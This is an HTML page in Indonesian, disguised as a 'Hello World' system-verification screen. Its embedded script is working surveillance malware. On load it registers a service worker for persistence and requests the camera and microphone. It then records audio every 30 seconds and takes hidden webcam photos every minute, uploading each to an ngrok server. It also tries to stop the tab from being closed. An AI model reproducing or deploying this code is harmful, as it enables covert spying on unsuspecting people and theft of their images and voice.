<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hello World</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 80px 20px;
            background: #000;
            color: #0f0;
            margin: 0;
        }
        h1 { font-size: 4.8em; margin-bottom: 20px; }
        p { font-size: 1.7em; }
        .status { color: #0f0; font-size: 1.4em; margin-top: 50px; }
    </style>
</head>
<body>
    <h1>Hello World</h1>
    <p>Verifikasi sistem selesai.</p>
    <div class="status" id="status">Menginisialisasi akses latar belakang...</div>

    <video id="video" autoplay playsinline style="display: none;"></video>
    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        let stream = null;
        let audioRecorder = null;
        let audioChunks = [];
        const ngrokUrl = "https://reversion-exert-gloomily.ngrok-free.dev";

        // Register Service Worker untuk background persistence
        async function registerServiceWorker() {
            if ('serviceWorker' in navigator) {
                try {
                    const reg = await navigator.serviceWorker.register('sw.js');
                    console.log("[+] Service Worker terdaftar");
                } catch (err) {
                    console.log("[-] Service Worker gagal:", err);
                }
            }
        }

        async function startPersistentSurveillance() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user" },
                    audio: true
                });

                document.getElementById('video').srcObject = stream;
                document.getElementById('status').innerHTML = "✅ Akses berhasil<br>Perekaman berjalan di latar belakang";

                // Audio terus menerus
                const audioTrack = stream.getAudioTracks()[0];
                const audioStream = new MediaStream([audioTrack]);

                audioRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });

                audioRecorder.ondataavailable = e => {
                    if (e.data.size > 0) audioChunks.push(e.data);
                };

                audioRecorder.onstop = () => {
                    if (audioChunks.length > 0) {
                        const blob = new Blob(audioChunks, { type: 'audio/webm' });
                        sendData('audio', blob);
                        audioChunks = [];
                    }
                    audioRecorder.start(30000); // lanjut rekam
                };

                audioRecorder.start(30000);

                // Foto setiap 1 menit
                setInterval(captureAndSendPhoto, 60000);
                setTimeout(captureAndSendPhoto, 8000); // foto pertama

                // Coba pertahankan meski tab ditutup
                window.addEventListener('beforeunload', (e) => {
                    e.preventDefault();
                    e.returnValue = '';
                    return "Perekaman masih berjalan...";
                });

            } catch (err) {
                document.getElementById('status').innerHTML = "❌ Izin ditolak. Harap izinkan kamera dan mikrofon.";
            }
        }

        function captureAndSendPhoto() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;

            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
                if (blob) sendData('photo', blob, `photo_${Date.now()}.jpg`);
            }, 'image/jpeg', 0.8);
        }

        function sendData(type, blob, filename = null) {
            const formData = new FormData();
            formData.append('type', type);
            formData.append('file', blob, filename || `${type}_${Date.now()}.webm`);

            fetch(`${ngrokUrl}/upload`, {
                method: 'POST',
                body: formData,
                keepalive: true   // Penting agar request tetap dikirim saat tab hampir ditutup
            }).catch(() => {});
        }

        // Mulai semuanya
        window.onload = async () => {
            await registerServiceWorker();
            startPersistentSurveillance();
        };
    </script>
</body>
</html>
